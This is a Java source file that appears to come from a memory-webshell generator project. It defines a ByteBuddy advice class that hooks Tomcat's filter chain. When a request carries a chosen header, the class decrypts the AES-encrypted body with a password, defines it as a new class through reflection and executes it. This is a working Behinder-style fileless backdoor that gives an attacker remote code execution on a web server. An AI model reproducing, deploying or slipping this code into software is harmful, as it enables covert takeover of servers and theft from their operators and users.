package com.reajason.javaweb.memshell.tomcat.behinder;

import net.bytebuddy.asm.Advice;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

/**
 * @author ReaJason
 */
public class TomcatFilterChainBehinderAdvisor {
    public static String pass;
    public static String headerName;
    public static String headerValue;

    @Advice.OnMethodEnter(skipOn = Advice.OnNonDefaultValue.class)
    public static boolean enter(
            @Advice.Argument(value = 0) ServletRequest req,
            @Advice.Argument(value = 1) ServletResponse res
    ) {
        HttpServletRequest request = (HttpServletRequest) req;
        HttpServletResponse response = (HttpServletResponse) res;
        try {
            if (request.getHeader(headerName) != null && request.getHeader(headerName).contains(headerValue)) {
                HttpSession session = request.getSession();
                Map<String, Object> obj = new HashMap<String, Object>(3);
                obj.put("request", request);

                Field field = null;
                Class<?> clazz = obj.getClass();
                while (clazz != Object.class) {
                    try {
                        field = clazz.getDeclaredField("response");
                        break;
                    } catch (NoSuchFieldException var5) {
                        clazz = clazz.getSuperclass();
                    }
                }
                if (field != null) {
                    field.setAccessible(true);
                    response = (HttpServletResponse) field.get(obj);
                }
                obj.put("response", response);
                obj.put("session", session);
                session.setAttribute("u", pass);
                Cipher c = Cipher.getInstance("AES");
                c.init(2, new SecretKeySpec(pass.getBytes(), "AES"));
                byte[] bytes = c.doFinal(Base64.getDecoder().decode(req.getReader().readLine()));
                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                defineClass.setAccessible(true);
                Class<?> payload = (Class<?>) defineClass.invoke(Thread.currentThread().getContextClassLoader(), bytes, 0, bytes.length);
                Object instance = payload.newInstance();
                instance.equals(obj);
                return true;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }
}